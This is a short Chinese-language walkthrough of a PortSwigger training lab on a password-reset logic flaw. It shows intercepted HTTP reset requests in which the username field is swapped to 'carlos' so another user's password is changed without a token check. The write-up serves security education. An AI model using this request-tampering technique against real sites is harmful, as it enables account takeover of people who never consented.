# LAB：密码重置逻辑故障

来源：portswigger

##### 漏洞描述：

网站在用户重置密码的时候会生成一个URL，让用户修改密码，但是其令牌参数是被修改的账户名，容易猜测，并且在重置密码表单提交时没有再次验证令牌，第一次申请修改密码时检查了令牌，但是第二次却没有检查，所以我们可以抓包第二次的请求，删除令牌，就可以重置任意用户的密码。

##### 题目描述：

该LAB的密码重置功能功能存在漏洞，要晚餐LAB，请重置Carlos的密码。

##### 解决方案：

先根据自己的凭证去修改密码，抓包第一个修改密码的请求：

```
POST /forgot-password
username=wiener
```

把wiener改成目标用户名，不行，因为有令牌检查。

之后获取发送的修改密码的URL，尝试修改密码抓包请求：

```
POST /forgot-password?temp-forgot-password-token=1p6gq5kusa24q08vv64d55jengn1der8 HTTP/2

temp-forgot-password-token=1p6gq5kusa24q08vv64d55jengn1der8&username=wiener&new-password-1=1&new-password-2=1
```

这里把wiener换成carlos,没有进行令牌验证，所以成功修改carlos的密码。

